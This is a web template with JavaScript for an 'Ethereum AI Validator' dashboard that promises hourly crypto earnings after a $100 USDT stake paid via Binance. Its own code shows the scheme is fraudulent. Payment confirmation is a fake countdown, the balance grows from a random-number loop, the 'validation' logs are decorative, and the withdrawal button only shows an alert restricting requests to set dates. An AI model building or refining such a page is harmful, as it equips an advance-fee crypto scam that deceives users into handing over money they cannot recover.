{% extends "base.html" %}

{% block title %}Dashboard - Ethereum AI Validator{% endblock %}

{% block content %}
<div class="dashboard-container animate-fade-in" style="display: grid; grid-template-columns: 1fr 300px; gap: 2rem;">

    <!-- Main Panel -->
    <div class="main-panel">
        <div class="glass-panel" style="margin-bottom: 2rem;">
            <h1 class="text-gradient">Validator Dashboard</h1>
            <p style="color: var(--text-muted); margin-bottom: 2rem;">Analyze your device and start training AI models
                for Ethereum validation.</p>

            <!-- Step 1: Device Check -->
            <div id="device-check-section"
                style="background: rgba(0,0,0,0.2); padding: 1.5rem; border-radius: 8px; margin-bottom: 2rem; border: 1px solid var(--glass-border);">
                <h3 style="margin-bottom: 1rem;">Device Analysis</h3>
                <p style="margin-bottom: 1rem; color: var(--text-muted); font-size: 0.9rem;">
                    Our system is intelligent enough to analyze your device's computing power and determine your earning
                    rate depending on current ETH blockchain conditions.
                </p>
                <button id="check-device-btn" class="btn-primary">Check My Device Power</button>

                <div id="device-result"
                    style="display: none; margin-top: 1.5rem; border-top: 1px solid rgba(255,255,255,0.1); padding-top: 1.5rem;">
                    <!-- Results populated by JS -->
                </div>
            </div>

            <!-- Step 2: Pay Stake -->
            <div id="stake-section"
                style="background: rgba(0,0,0,0.2); padding: 1.5rem; border-radius: 8px; margin-bottom: 2rem; border: 1px solid var(--glass-border); display: none;">
                <h3 style="margin-bottom: 1rem;">Initialize Stake ($100)</h3>
                <p style="margin-bottom: 1rem; color: var(--text-muted); font-size: 0.9rem;">
                    To begin training your allocated workloads on our network, a minimum $100 USDT equivalent stake must
                    be deposited to the Ethereum staking contract via Binance.
                </p>
                <!-- Opens Binance in new tab as requested -->
                <a href="https://www.binance.com/" target="_blank" class="btn-secondary"
                    style="margin-bottom: 1rem; display: block; text-align: center;">Pay Stake via Binance</a>

                <button id="confirm-payment-btn" class="btn-primary"
                    style="width: 100%; background: linear-gradient(135deg, #f59e0b, #ea580c);">I have paid 100
                    USDT</button>
                <p style="color: #ef4444; font-size: 0.8rem; text-align: center; margin-top: 0.5rem; font-weight: 600;">
                    Warning: False claims of payment will lead to an immediate permanent ban.</p>
            </div>

            <!-- Wait for Payment Confirmation -->
            <div id="confirmation-countdown"
                style="display: none; background: rgba(0,0,0,0.2); padding: 2rem; border-radius: 8px; text-align: center; border: 1px solid var(--primary-blue);">
                <h3 class="text-gradient" style="margin-bottom: 1rem;">Confirming on Blockchain...</h3>
                <p style="color: var(--text-muted); margin-bottom: 1rem;">Estimated time until confirmation:</p>
                <div id="countdown-timer"
                    style="font-size: 3rem; font-weight: 800; font-variant-numeric: tabular-nums;">00:05</div>
            </div>

            <!-- Hacker Terminal Section -->
            <div id="terminal-section" class="terminal-container" style="display: none;">
                <div class="terminal-header">
                    <span>ETH::AI_VALIDATOR_NODE</span>
                    <span id="terminal-timer">TIME: 00:00:00</span>
                </div>
                <div id="terminal-output" class="terminal-content">
                    <div class="terminal-line">System initialized. Awaiting training orders...</div>
                </div>
            </div>

        </div>
    </div>

    <!-- Sidebar / Earnings Panel -->
    <div class="sidebar">
        <div class="glass-panel" style="position: sticky; top: 100px;">
            <h3 style="margin-bottom: 1.5rem; text-align: center;">Your Balance</h3>

            <div style="text-align: center; margin-bottom: 2rem;">
                <div style="font-size: 2.5rem; font-weight: 800; color: var(--primary-green); font-variant-numeric: tabular-nums;"
                    id="eth-balance">0.00000000</div>
                <div style="color: var(--text-muted); font-weight: 600;">ETH</div>
                <div style="margin-top: 0.5rem; font-size: 1.2rem; color: #f8fafc;" id="usdt-balance">â‰ˆ $0.00 USDT</div>
            </div>

            <button id="start-training-btn" class="btn-primary" style="width: 100%; display: none;" disabled>Continue
                Validating</button>
            <button id="stop-training-btn" class="btn-secondary"
                style="width: 100%; display: none; margin-top: 1rem; border-color: #ef4444; color: #ef4444;">Stop
                Validating</button>
            <div id="training-status"
                style="margin-top: 1rem; text-align: center; font-size: 0.9rem; color: var(--primary-green); display: none;">
                ðŸŸ¢ Training Active - AI generating validations
            </div>

            <div
                style="margin-top: 2rem; padding-top: 1rem; border-top: 1px solid var(--glass-border); text-align: center;">
                <p style="color: var(--text-muted); font-size: 0.85rem; margin-bottom: 0.5rem;">Next Withdrawal Period:
                </p>
                <p style="font-weight: 600;" id="next-withdrawal">-</p>
                <p style="color: var(--text-muted); font-size: 0.75rem; margin-top: 0.5rem;">Withdrawals processed on
                    1st & 15th of the month. Min $100 USDT stake must remain.</p>
                <p style="color: #60a5fa; font-size: 0.75rem; margin-top: 0.5rem;">Note: You can request an emergency
                    full stake withdrawal of your $100 USDT at any time through the <a href="/contact"
                        style="color: #60a5fa; text-decoration: underline;">Contact Us</a> page.</p>
                <button id="withdraw-btn" class="btn-primary"
                    style="width: 100%; margin-top: 1rem; font-size: 0.9rem; padding: 0.6rem;">Initiate
                    Withdrawal</button>
            </div>
        </div>
    </div>

</div>

<!-- Device Tier Table Modal (Hidden by default) -->
<div id="tier-table-wrapper" style="margin-top: 2rem; display: none;">
    <div class="glass-panel">
        <h3 style="margin-bottom: 1rem;">Device AI Training Tiers</h3>
        <table style="width: 100%; border-collapse: collapse; text-align: left;">
            <thead>
                <tr style="border-bottom: 1px solid var(--primary-blue);">
                    <th style="padding: 1rem 0; color: var(--primary-blue);">Device Category</th>
                    <th style="padding: 1rem 0; color: var(--primary-blue);">Earning Potential (USDT/hr)</th>
                </tr>
            </thead>
            <tbody>
                <tr style="border-bottom: 1px solid rgba(255,255,255,0.05);">
                    <td style="padding: 1rem 0;">Low Power (Mobile Phones)</td>
                    <td style="padding: 1rem 0;">~$2.00</td>
                </tr>
                <tr style="border-bottom: 1px solid rgba(255,255,255,0.05);">
                    <td style="padding: 1rem 0;">Medium Power (Standard Laptops)</td>
                    <td style="padding: 1rem 0;">~$10.00</td>
                </tr>
                <tr style="border-bottom: 1px solid rgba(255,255,255,0.05);">
                    <td style="padding: 1rem 0;">High Power (Desktops/MacBooks)</td>
                    <td style="padding: 1rem 0;">~$20.00</td>
                </tr>
                <tr>
                    <td style="padding: 1rem 0;">Ultra Power (Gaming PC / Workstation)</td>
                    <td style="padding: 1rem 0;">~$40.00</td>
                </tr>
            </tbody>
        </table>
    </div>
</div>

{% endblock %}

{% block scripts %}
<script>
    const ETH_PRICE = 3500;

    // UI Elements
    const checkDeviceBtn = document.getElementById('check-device-btn');
    const deviceResult = document.getElementById('device-result');
    const stakeSection = document.getElementById('stake-section');
    const confirmPaymentBtn = document.getElementById('confirm-payment-btn');
    const confirmCountdown = document.getElementById('confirmation-countdown');
    const timerDisplay = document.getElementById('countdown-timer');
    const startTrainingBtn = document.getElementById('start-training-btn');
    const stopTrainingBtn = document.getElementById('stop-training-btn');
    const trainingStatus = document.getElementById('training-status');
    const ethBalanceDisplay = document.getElementById('eth-balance');
    const usdtBalanceDisplay = document.getElementById('usdt-balance');
    const deviceCheckSection = document.getElementById('device-check-section');
    const tierTable = document.getElementById('tier-table-wrapper');
    const terminalSection = document.getElementById('terminal-section');
    const terminalOutput = document.getElementById('terminal-output');
    const terminalTimerText = document.getElementById('terminal-timer');
    const withdrawBtn = document.getElementById('withdraw-btn');

    let currentUser = null;
    let ethBalance = 0;
    let trainingTimeSeconds = 0;
    let hourlyRateUSD = 8.50; // default medium
    let isTraining = false;
    let mainLoopInterval;
    let transactionHistory = [];

    // Format timer
    function formatTime(sec) {
        const h = Math.floor(sec / 3600).toString().padStart(2, '0');
        const m = Math.floor((sec % 3600) / 60).toString().padStart(2, '0');
        const s = (sec % 60).toString().padStart(2, '0');
        return `${h}:${m}:${s}`;
    }

    // Set Next Withdrawal Date
    function setNextWithdrawal() {
        document.getElementById('next-withdrawal').innerText = "1st & 15th of the month";
    }
    setNextWithdrawal();

    function updateBalanceDisplay() {
        ethBalanceDisplay.innerText = ethBalance.toFixed(8);
        const usdtEquivalent = ethBalance * ETH_PRICE;
        usdtBalanceDisplay.innerText = `â‰ˆ $${usdtEquivalent.toFixed(2)} USDT`;
        terminalTimerText.innerText = `TIME: ` + formatTime(trainingTimeSeconds);
    }

    // FIREBASE SYNC LOGIC
    auth.onAuthStateChanged((user) => {
        if (!user) {
            window.location.href = '/';
            return;
        }
        currentUser = user;
        loadUserData();
    });

    async function loadUserData() {
        if (!db) {
            console.error("Firestore DB not initialized!");
            return;
        }
        const userRef = db.collection("users").doc(currentUser.uid);
        const doc = await userRef.get();
        if (!doc.exists) {
            // New user initialization
            await userRef.set({
                email: currentUser.email,
                ethBalance: 0,
                trainingTimeSeconds: 0,
                stakePaid: false,
                lastHourlyRate: 8.50,
                deviceDetails: "Not Checked Yet"
            });
        } else {
            const data = doc.data();
            ethBalance = data.ethBalance || 0;
            trainingTimeSeconds = data.trainingTimeSeconds || 0;
            hourlyRateUSD = data.lastHourlyRate || 8.50;
            transactionHistory = data.transactionHistory || [];

            // UNCONDITIONALLY UPDATE UI BALANCE UPON LOAD
            updateBalanceDisplay();

            // Restore terminal history
            if (transactionHistory.length > 0) {
                terminalOutput.innerHTML = ''; // clear default init text
                transactionHistory.forEach(log => {
                    const line = document.createElement('div');
                    line.className = 'terminal-line';
                    if (log.includes("REJECTED") || log.includes("paused")) {
                        line.style.color = '#ef4444';
                    }
                    line.innerText = log;
                    terminalOutput.appendChild(line);
                });
                terminalOutput.scrollTop = terminalOutput.scrollHeight;
            }

            // Auto-Check Device on refresh/login if they have a history
            const deviceInfo = {
                userAgent: navigator.userAgent,
                cores: navigator.hardwareConcurrency || "Unknown",
                memory: navigator.deviceMemory || "Unknown"
            };

            // Perform background check
            fetch('/api/detect-device', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(deviceInfo)
            }).then(res => res.json()).then(newData => {
                if (newData.device_assessment !== data.deviceDetails) {
                    // Update if device changed physically
                    db.collection("users").doc(currentUser.uid).set({
                        deviceDetails: newData.device_assessment,
                        lastHourlyRate: newData.hourly_rate
                    }, { merge: true });
                    hourlyRateUSD = newData.hourly_rate; // override loaded
                }
            }).catch(e => console.error("Auto detect failed", e));

            const usdtEquivalent = ethBalance * ETH_PRICE;
            if (data.stakePaid || usdtEquivalent >= 100) {
                // Skip device check and payment, go straight to terminal!
                deviceCheckSection.style.display = 'none';
                stakeSection.style.display = 'none';
                terminalSection.style.display = 'block';
                startTrainingBtn.style.display = 'block';
                startTrainingBtn.disabled = false;
                startTrainingBtn.innerText = "Continue Validating";

                if (!data.stakePaid) {
                    // Fast-track them if their balance was manually raised by admin
                    await userRef.set({ stakePaid: true }, { merge: true });
                }
            }
        }
    }

    // Withdraw Logic
    if (withdrawBtn) {
        withdrawBtn.addEventListener('click', () => {
            const date = new Date();
            const day = date.getDate();
            if (day === 1 || day === 15) {
                alert("Withdrawal initiated! Your request is being processed. It may take up to 24 hours to clear on the Ethereum network.");
            } else {
                alert("Withdrawal Denied: Withdrawals are only processed on the 1st and 15th of every month. Please wait until the designated payout window.");
            }
        });
    }

    async function saveUserData() {
        if (!currentUser) return;

        // Keep history array manageable (last 50 logs max to avoid massive docs)
        if (transactionHistory.length > 50) {
            transactionHistory = transactionHistory.slice(transactionHistory.length - 50);
        }

        const userRef = db.collection("users").doc(currentUser.uid);
        await userRef.set({
            ethBalance: ethBalance,
            trainingTimeSeconds: trainingTimeSeconds,
            lastHourlyRate: hourlyRateUSD,
            transactionHistory: transactionHistory
        }, { merge: true });
    }

    // Simulated Device Check
    checkDeviceBtn.addEventListener('click', async () => {
        checkDeviceBtn.innerHTML = "Analyzing Device capabilities...";
        checkDeviceBtn.disabled = true;
        const deviceInfo = {
            userAgent: navigator.userAgent,
            cores: navigator.hardwareConcurrency || "Unknown",
            memory: navigator.deviceMemory || "Unknown"
        };
        try {
            const response = await fetch('/api/detect-device', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(deviceInfo)
            });
            const data = await response.json();
            hourlyRateUSD = data.hourly_rate;

            deviceResult.innerHTML = `
                <div style="background: rgba(16, 185, 129, 0.1); border: 1px solid var(--primary-green); padding: 1rem; border-radius: 6px;">
                    <h4 style="color: var(--primary-green); margin-bottom: 0.5rem;">Device Detected!</h4>
                    <p style="font-size: 0.9rem; margin-bottom: 0.5rem;"><strong>Specs:</strong> ${data.device_assessment}</p>
                    <p style="font-size: 1.1rem; color: #f8fafc;"><strong>Allocated Rate:</strong> $${data.hourly_rate}/hour</p>
                </div>`;
            deviceResult.style.display = 'block';
            tierTable.style.display = 'block';
            checkDeviceBtn.style.display = 'none';

            // Save device details to DB
            if (currentUser) {
                await db.collection("users").doc(currentUser.uid).set({
                    deviceDetails: data.device_assessment,
                    lastHourlyRate: data.hourly_rate
                }, { merge: true });
            }

            const usdtEquivalent = ethBalance * ETH_PRICE;
            if (usdtEquivalent >= 100) {
                stakeSection.style.display = 'none';
                terminalSection.style.display = 'block';
                startTrainingBtn.style.display = 'block';
                startTrainingBtn.disabled = false;
                startTrainingBtn.innerText = "Continue Validating";
                if (currentUser) {
                    await db.collection("users").doc(currentUser.uid).set({ stakePaid: true }, { merge: true });
                }
            } else {
                stakeSection.style.display = 'block';
            }

        } catch (err) {
            checkDeviceBtn.innerHTML = "Error analyzing. Try again.";
            checkDeviceBtn.disabled = false;
        }
    });

    // Confirm Payment
    confirmPaymentBtn.addEventListener('click', () => {
        stakeSection.style.display = 'none';
        deviceCheckSection.style.display = 'none';
        confirmCountdown.style.display = 'block';

        let timeRemaining = 5; // drastically reduced for testing, 5 secs
        const countdownInterval = setInterval(async () => {
            timeRemaining--;
            timerDisplay.innerText = `00:0${timeRemaining}`;
            if (timeRemaining <= 0) {
                clearInterval(countdownInterval);
                confirmCountdown.style.display = 'none';

                // Add initial bonus balance and mark as paid
                ethBalance += (100 / ETH_PRICE);
                updateBalanceDisplay();
                await db.collection("users").doc(currentUser.uid).set({
                    stakePaid: true,
                    ethBalance: ethBalance
                }, { merge: true });

                terminalSection.style.display = 'block';
                startTrainingBtn.style.display = 'block';
                startTrainingBtn.disabled = false;
                startTrainingBtn.innerText = "Start Validating";
            }
        }, 1000);
    });

    // Training Logic Loop
    async function appendLog() {
        try {
            const res = await fetch('/api/generate-validation-log');
            const data = await res.json();

            const text = `[${formatTime(trainingTimeSeconds)}] ` + data.log;
            const line = document.createElement('div');
            line.className = 'terminal-line';
            line.innerText = text;
            terminalOutput.appendChild(line);

            transactionHistory.push(text);

            // auto scroll
            terminalOutput.scrollTop = terminalOutput.scrollHeight;
        } catch (e) { }
    }

    startTrainingBtn.addEventListener('click', () => {
        startTrainingBtn.style.display = 'none';
        stopTrainingBtn.style.display = 'block';
        trainingStatus.style.display = 'block';
        isTraining = true;

        const usdPerSecond = (hourlyRateUSD / 3600);
        const ethPerSecond = usdPerSecond / ETH_PRICE;

        // Visual Logs & Earnings Loop (every second, logic applies per tick)
        mainLoopInterval = setInterval(() => {
            trainingTimeSeconds += 1;

            // Random chance of win vs loss based on 50-75% win rate
            // 65% base win rate
            const isWin = Math.random() < 0.65;

            if (isWin) {
                // Successful Validation
                ethBalance += ethPerSecond;
                if (trainingTimeSeconds % 3 === 0) {
                    appendLog();
                }
            } else {
                // Failed Validation - deduct the standard tick amount
                ethBalance -= ethPerSecond;
                // Cannot drop below zero
                if (ethBalance < 0) ethBalance = 0;

                if (trainingTimeSeconds % 3 === 0) {
                    const text = `[${formatTime(trainingTimeSeconds)}] TRANSACTION REJECTED. Validation failed. Penalty applied.`;
                    const line = document.createElement('div');
                    line.className = 'terminal-line';
                    line.style.color = '#ef4444'; // Red error font
                    line.innerText = text;
                    terminalOutput.appendChild(line);
                    terminalOutput.scrollTop = terminalOutput.scrollHeight;

                    transactionHistory.push(text);
                }
            }

            updateBalanceDisplay();

            if (trainingTimeSeconds % 10 === 0) {
                saveUserData(); // backup every 10 seconds
            }
        }, 1000);
    });

    stopTrainingBtn.addEventListener('click', () => {
        isTraining = false;
        clearInterval(mainLoopInterval);

        stopTrainingBtn.style.display = 'none';
        startTrainingBtn.style.display = 'block';
        trainingStatus.style.display = 'none';

        const text = `[SYSTEM] Validation process paused.`;
        const line = document.createElement('div');
        line.className = 'terminal-line';
        line.style.color = '#ef4444';
        line.innerText = text;
        terminalOutput.appendChild(line);
        terminalOutput.scrollTop = terminalOutput.scrollHeight;

        transactionHistory.push(text);

        saveUserData();
    });

</script>
{% endblock %}